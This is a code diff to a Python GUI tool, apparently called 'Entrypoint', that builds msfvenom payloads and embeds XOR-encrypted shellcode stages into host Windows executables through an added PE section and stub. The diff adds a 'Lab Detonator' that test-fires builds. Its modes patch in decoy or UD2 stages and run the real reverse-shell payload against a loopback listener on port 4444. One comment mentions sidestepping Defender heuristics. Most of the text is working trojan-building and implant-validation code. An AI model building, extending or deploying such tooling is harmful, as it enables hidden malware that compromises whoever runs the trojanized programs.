@@ -1438,7 +1438,7 @@ class Entrypoint:
             if cfg["fmt"] in ("exe", "exe-only", "service", "dll", "msi", "elf", "macho", "so"):
                 # msfvenom already wrapped it — ship as-is, no loader needed
                 ext = safe_name(cfg["fmt"])
-                final = os.path.join(OUT_DIR, safe_name("PF-msf-" + safe_name(cfg["payload"]) + "-" + rnd_hex(2)))
+                final = os.path.join(OUT_DIR, safe_name("EP-msf-" + safe_name(cfg["payload"]) + "-" + rnd_hex(2)))
                 os.makedirs(final, exist_ok=True)
                 shutil.copyfile(os.path.join(outdir, "payload." + ext),
                                 os.path.join(final, "payload." + ext))
@@ -1479,6 +1479,8 @@ class EntrypointGUI:
         self.q = queue.Queue()
         self.worker = None
         self._authorized = False
+        self.last_pe_outdir = ""
+        self.detonate_results = None
 
         root.title(APP_NAME)
         root.geometry("520x660")
@@ -1575,6 +1577,13 @@ class EntrypointGUI:
                                wrap="word", relief="flat", padx=6, pady=4)
 
         self.btn_gen = ttk.Button(frm, text="Generate", command=self._generate)
+
+        # Lab Detonator — safe local test fire of the last build
+        self.detonate_var = tk.BooleanVar(value=False)
+        self.chk_detonate = ttk.Checkbutton(frm, text="Detonate after build",
+                                            variable=self.detonate_var)
+        self.btn_detonate = ttk.Button(frm, text="Detonate last build",
+                                       command=self._detonate)
 
         # Quick way to the real output folder (dot-folder next to state.json —
         # not the git clone, where users instinctively browse first)
@@ -1688,6 +1697,9 @@ class EntrypointGUI:
         self._console_row = r
         r += 1
         self.btn_gen.grid(row=r, column=0, columnspan=2, sticky="ew", **pad)
+        r += 1
+        self.chk_detonate.grid(row=r, column=0, sticky="w", **pad)
+        self.btn_detonate.grid(row=r, column=1, sticky="e", **pad)
 
     def _browse_implant(self):
         p = filedialog.askopenfilename(
@@ -1786,6 +1798,9 @@ class EntrypointGUI:
                 self.console.insert("end", msg + "\n")
                 self.console.see("end")
                 self.console.configure(state="disabled")
+                if self.detonate_results:
+                    results, self.detonate_results = self.detonate_results, None
+                    _DetonateDialog(self.root, results)
         except queue.Empty:
             pass
         self.root.after(120, self._poll)
@@ -1826,6 +1841,57 @@ class EntrypointGUI:
             try:
                 outdir = self.f.run(cfg)
                 self._log(f"[+] Build directory: {outdir}")
+                if cfg.get("pe_inject"):
+                    self.last_pe_outdir = outdir
+                    if self.detonate_var.get():
+                        out = self.f.detonate_report(outdir, lport=DETONATE_PORT,
+                                                     log=self._log)
+                        self.detonate_results = out
+                        self._log("[+] Detonation complete — see report window.")
+            except EntrypointError as e:
+                self._log(f"[!] {e}")
+            except Exception as e:
+                self._log(f"[!] unexpected: {type(e).__name__}: {e}")
+        self.worker = threading.Thread(target=work, daemon=True)
+        self.worker.start()
+
+    def _detonate(self):
+        """Lab-only test fire of the last PE-embed build: three escalating
+        modes — smoke decoy, ud2 execution proof, real loopback connect-back."""
+        if self.worker and self.worker.is_alive():
+            messagebox.showwarning(APP_NAME, "A build is already running.")
+            return
+        if not self._authorized:
+            if not messagebox.askyesno(
+                    APP_NAME,
+                    "The Detonator runs the real payload against 127.0.0.1 "
+                    "in connect mode.\nConfirm you have written authorization "
+                    "for local lab testing. Continue?"):
+                self._log("[!] Detonation cancelled — no authorization confirmed.")
+                return
+            self._authorized = True
+            self._log("[i] Authorization confirmed for this session.")
+        if not self.last_pe_outdir:
+            messagebox.showinfo(APP_NAME,
+                                "No PE-embed build yet — generate one first "
+                                "(tick PE injection and pick a host exe).")
+            return
+        if not messagebox.askyesno(
+                APP_NAME,
+                "Run the Lab Detonator on the last build?\n\n"
+                "smoke   — decoy stage, host must run clean\n"
+                "ud2     — stage must crash 0xC000001D (proof it executes)\n"
+                "connect — REAL payload calls 127.0.0.1:%d\n\n"
+                "Lab use only." % DETONATE_PORT):
+            return
+
+        outdir, lport = self.last_pe_outdir, DETONATE_PORT
+
+        def work():
+            try:
+                self.detonate_results = self.f.detonate_report(
+                    outdir, lport=lport, log=self._log)
+                self._log("[+] Detonation complete — see report window.")
             except EntrypointError as e:
                 self._log(f"[!] {e}")
             except Exception as e:
@@ -1834,7 +1900,32 @@ class EntrypointGUI:
         self.worker.start()
 
 
-class _HostPresetDialog:
+class _DetonateDialog:
+    """Modal detonation report — shows the three-mode matrix after a run."""
+
+    def __init__(self, parent, results, title="Lab Detonator report"):
+        win = tk.Toplevel(parent)
+        self.win = win
+        win.title(title)
+        win.transient(parent)
+        win.grab_set()
+        win.resizable(False, False)
+        frm = ttk.Frame(win, padding=12)
+        frm.pack(fill="both", expand=True)
+        ttk.Label(frm, text="Detonation results (lab only):").pack(anchor="w")
+        box = tk.Text(frm, width=64, height=10, bg=CONSOLE_BG, fg="#cccccc",
+                      relief="flat", padx=6, pady=4)
+        for m, r in results.items():
+            mark = "FIRED " if r["fired"] else "no fire"
+            box.insert("end", f"[{m:>7}] exit={r['exit_code']}  {mark}\n"
+                              f"          {r['detail']}\n")
+        box.configure(state="disabled")
+        box.pack(fill="both", expand=True, pady=(6, 10))
+        ttk.Button(frm, text="Close", command=win.destroy).pack(anchor="e")
+        win.wait_window()
+
+
+
     """Tiny modal chooser — a listbox of "bucket › label (arch)" entries.
     Returns the chosen key via .result ("" = cancelled). No toplevel geometry
     guessing: transient to the parent, centered by Tk."""
@@ -1895,7 +1986,7 @@ def launch_gui():
         log = os.path.join(STATE_DIR, "crash.log")
         os.makedirs(STATE_DIR, exist_ok=True)
         with open(log, "a") as fh:
-            fh.write("\n" + _time.strftime("%Y-%m-%d %H:%M:%S") + " (GUI callback)\n")
+            fh.write("\n" + time.strftime("%Y-%m-%d %H:%M:%S") + " (GUI callback)\n")
             tb.print_exception(exc_type, exc_value, exc_tb, file=fh)
 
     root.report_callback_exception = _log_cb_exc
@@ -1913,6 +2004,200 @@ def launch_gui():
     root.after(250, lambda: root.attributes("-topmost", False))
     root.mainloop()
     return 0
+
+
+DETONATE_PORT = 4444           # loopback port the Lab Detonator listens on
+
+
+# ---------------------------------------------------------------------------
+# Lab Detonator — safe local test harness for finished builds.
+# Productizes the ud2/live-fire method used to validate the PE-embed stubs:
+# it runs a build in three escalating modes and reports what actually fired.
+#
+#   smoke   — run the build with a decoy payload (EB FE self-jump) patched
+#             over the stage: proves decrypt→thread→OEP without running any
+#             real payload. Host either exits normally (stub + OEP intact)
+#             or dies with a distinctive exit code the harness recognizes.
+#   ud2     — stage replaced with an illegal instruction (0F 0B): the host
+#             must die with STATUS_ILLEGAL_INSTRUCTION (C000001D). This is
+#             the end-to-end proof that the stub decrypted and STARTED the
+#             stage. Exit 0 would mean the stub never ran the payload.
+#   connect — the build's real stage runs against a loopback listener on
+#             the configured LPORT; the harness counts the connect-back.
+#             Only meaningful for reverse-shell payloads. LAB USE ONLY.
+# ---------------------------------------------------------------------------
+
+DECOY_HANG = b"\xEB\xFE"     # jmp $ — never returns, distinctive under a debugger
+DECOY_UD2 = b"\x0F\x0B"      # illegal instruction → STATUS_ILLEGAL_INSTRUCTION
+EXIT_ILLEGAL = 0xC000001D    # 3221225785
+
+
+def _find_entp_stage(patched: bytes):
+    """Locate the .entp section in a patched PE: returns (raw_offset, enc_len,
+    key_off, stub_off, stub_len) or None. Reuses the selftest's stub-locator
+    logic (first 8 stub bytes at a 16-aligned offset)."""
+    lf = struct.unpack_from("<I", patched, 0x3C)[0]
+    nsec = struct.unpack_from("<H", patched, lf + 6)[0]
+    soh = struct.unpack_from("<H", patched, lf + 20)[0]
+    first = lf + 24 + soh
+    for i in range(nsec):
+        h = first + i * 40
+        if bytes(patched[h:h + 8]).rstrip(b"\x00") != b".entp":
+            continue
+        vsz, _va, _rsz, rawp = struct.unpack_from("<IIII", patched, h + 8)
+        stage = bytes(patched[rawp:rawp + vsz])
+        for tmpl in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
+            stub_at = next((o for o in range(16, len(stage) - 8, 16)
+                            if stage[o:o + 8] == tmpl[:8]), -1)
+            if stub_at >= 16:
+                # Exact stage layout: enc + key end where the zero padding to
+                # the 16-aligned stub begins. Count the zeros back from the
+                # stub to find the key's end, then enc_len = key_end - 16.
+                # (An aligned guess alone would overwrite key bytes when the
+                # payload length is not 16-aligned — the decoy swap must be
+                # byte-exact or the stub decrypts garbage.)
+                p = stub_at
+                while p > 32 and stage[p - 1] == 0:
+                    p -= 1
+                enc_len = p - 16
+                if enc_len <= 0:
+                    continue
+                return (rawp, enc_len, enc_len, stub_at, len(tmpl))
+    return None
+
+
+def detonate(exe_path: str, mode: str, lhost: str = "127.0.0.1",
+             lport: int = 4444, timeout: float = 12.0,
+             log=lambda m: None) -> dict:
+    """Run one detonation and return a result dict:
+       {mode, exit_code, fired, oep_ok, detail}
+    fired  — the stage demonstrably executed (ud2: illegal-instruction exit;
+             connect: a TCP connection arrived).
+    oep_ok — the host ran to completion normally (exit 0), i.e. the stub's
+             jump-back to the original entry point is intact."""
+    import socket
+    res = {"mode": mode, "exit_code": None, "fired": False,
+           "oep_ok": False, "detail": ""}
+    data = open(exe_path, "rb").read()
+    if len(data) < 0x40 or data[:2] != b"MZ":
+        res["detail"] = "not a PE (or too small) — run this on a PE-embed build"
+        return res
+    loc = _find_entp_stage(data)
+    if not loc:
+        res["detail"] = "no .entp section found — run this on a PE-embed build"
+        return res
+    rawp, enc_len, key_off, stub_off, stub_len = loc
+    key = data[rawp + key_off: rawp + key_off + 16]
+    if len(key) != 16:
+        res["detail"] = "stage key missing (corrupt section?)"
+        return res
+
+    work = tempfile.mkdtemp(prefix="detonate-")
+    # single .exe extension, unique per call: "*.probe.exe" double extensions
+    # trip Defender's heuristics, and a reused name can race a still-open
+    # image section from the previous run (WinError 129, invalid image).
+    probe = os.path.join(
+        work, "%s-%s-forged.exe"
+        % (os.path.splitext(os.path.basename(exe_path))[0],
+           os.urandom(3).hex()))
+    srv = None
+    try:
+        if mode == "connect":
+            probe = exe_path                       # real payload, real build
+            srv = socket.socket()
+            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            srv.bind((lhost, lport))
+            srv.listen(1)
+            srv.settimeout(timeout)
+            log(f"[*] connect mode: listening on {lhost}:{lport} "
+                f"(up to {timeout:.0f}s) — the real payload runs")
+        else:
+            decoy = DECOY_UD2 if mode == "ud2" else DECOY_HANG
+            patched = bytearray(data)
+            # decoy tiled to EXACTLY enc_len: a longer slice-assign would
+            # resize the image and shift the stub — swap must be byte-exact
+            blob = (decoy * (enc_len // len(decoy) + 1))[:enc_len]
+            patched[rawp:rawp + enc_len] = xor_crypt(blob, key)
+            open(probe, "wb").write(bytes(patched))
+            time.sleep(0.2)     # let AV scanners release the fresh file
+            log(f"[*] {mode} mode: stage swapped for "
+                f"{'UD2 (0F 0B)' if mode == 'ud2' else 'EB FE decoy'}")
+
+        # Popen + manual wait: a hung probe (EB FE decoy loops forever) must
+        # not deadlock the harness in communicate() the way run() would —
+        # communicate() only blocks on the pipes AFTER a finished wait; on
+        # timeout we just note the hang and let `finally` clean up.
+        proc = subprocess.Popen([probe], stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE)
+        t0 = time.time()
+        try:
+            proc.wait(timeout=timeout + 5)
+            proc.communicate()      # drains pipes now that the process is gone
+        except subprocess.TimeoutExpired:
+            try:
+                proc.kill()     # EB FE loops forever — don't leak the probe
+                proc.wait(timeout=3)
+            except Exception:
+                pass
+            res["detail"] = ("probe timed out — EB FE decoy loops forever, "
+                             "which is the expected hang signature")
+            return res
+        res["exit_code"] = proc.returncode
+
+        if mode == "ud2":
+            res["fired"] = (proc.returncode == EXIT_ILLEGAL)
+            res["detail"] = ("stage executed and crashed on UD2 as expected — "
+                             "stub chain works" if res["fired"] else
+                             f"expected exit {EXIT_ILLEGAL:#x}, got "
+                             f"{proc.returncode:#x} — stage did NOT run")
+        elif mode == "connect":
+            try:
+                conn, addr = srv.accept()
+                res["fired"] = True
+                res["detail"] = (f"connect-back from {addr[0]} "
+                                 f"after {time.time() - t0:.1f}s")
+                conn.close()
+            except socket.timeout:
+                res["detail"] = f"no connect-back within {timeout:.0f}s"
+        else:  # smoke
+            res["fired"] = True     # decoy itself is unobservable; ud2 proves presence
+            res["oep_ok"] = (proc.returncode == 0)
+            res["detail"] = ("host exited 0 — stub + OEP chain intact"
+                             if res["oep_ok"] else
+                             f"host exited {proc.returncode:#x} (nonzero)")
+    except Exception as e:
+        res["detail"] = f"error: {type(e).__name__}: {e}"
+    finally:
+        if srv is not None:
+            srv.close()
+        if mode != "connect":
+            try:
+                os.remove(probe)
+            except OSError:
+                pass
+            shutil.rmtree(work, ignore_errors=True)
+    return res
+
+
+def detonate_report(outdir: str, modes=("smoke", "ud2", "connect"),
+                    lport: int = 4444, timeout: float = 12.0,
+                    log=lambda m: None) -> dict:
+    """Detonate a build directory's deliverable across the chosen modes and
+    return {mode: result_dict}. Finds the .exe deliverable automatically."""
+    exes = [p for p in glob.glob(os.path.join(outdir, "*.exe"))
+            if not p.endswith(".probe.exe")]
+    if not exes:
+        raise EntrypointError(f"no .exe deliverable found in {outdir}")
+    exe = sorted(exes, key=lambda p: -os.path.getsize(p))[0]
+    log(f"[*] Lab Detonator: {os.path.basename(exe)}")
+    out = {}
+    for m in modes:
+        r = detonate(exe, m, lport=lport, timeout=timeout, log=log)
+        out[m] = r
+        mark = "FIRED" if r["fired"] else "no fire"
+        log(f"  [{m}] exit={r['exit_code'] if r['exit_code'] is not None else '—'} "
+            f"{mark}: {r['detail']}")
+    return out
 
 
 def _selftest():
@@ -2105,6 +2390,33 @@ def _selftest():
                     except Exception as e:
                         fails.append(f"{target}/{kind}/{enc}/{inj}: {type(e).__name__}: {e}")
 
+    # 5b. Lab Detonator engine — stage locate + decoy swap round-trip
+    def _detonator_roundtrip():
+        host = _mini_pe(0x8664)
+        k = rnd_bytes(16)
+        patched = patch_pe(host, sc, k)
+        loc = _find_entp_stage(patched)
+        if not loc:
+            return False
+        rawp, enc_len, key_off, stub_off, stub_len = loc
+        key = patched[rawp + key_off: rawp + key_off + 16]
+        if xor_crypt(patched[rawp:rawp + enc_len], key) != sc:
+            return False
+        patched2 = bytearray(patched)
+        blob = (DECOY_UD2 * (enc_len // len(DECOY_UD2) + 1))[:enc_len]
+        patched2[rawp:rawp + enc_len] = xor_crypt(blob, key)
+        loc2 = _find_entp_stage(bytes(patched2))
+        if not loc2:
+            return False
+        r2p, e2, k2o, s2, _sl = loc2
+        return (e2 == enc_len and
+                xor_crypt(bytes(patched2[r2p:r2p + e2]),
+                          bytes(patched2[r2p + k2o:r2p + k2o + 16]))
+                == blob)
+    checks += 1
+    if not _detonator_roundtrip():
+        fails.append("detonator: stage locate/swap round-trip")
+
     print(f"selftest: {checks} checks, {len(fails)} failures")
     for x in fails:
         print("  FAIL:", x)
@@ -2123,7 +2435,7 @@ def main():
         log = os.path.join(STATE_DIR, "crash.log")
         os.makedirs(STATE_DIR, exist_ok=True)
         with open(log, "a") as fh:
-            fh.write("\n" + _time.strftime("%Y-%m-%d %H:%M:%S") + "\n")
+            fh.write("\n" + time.strftime("%Y-%m-%d %H:%M:%S") + "\n")
             traceback.print_exc(file=fh)
         print("crash logged to", log)
         raise
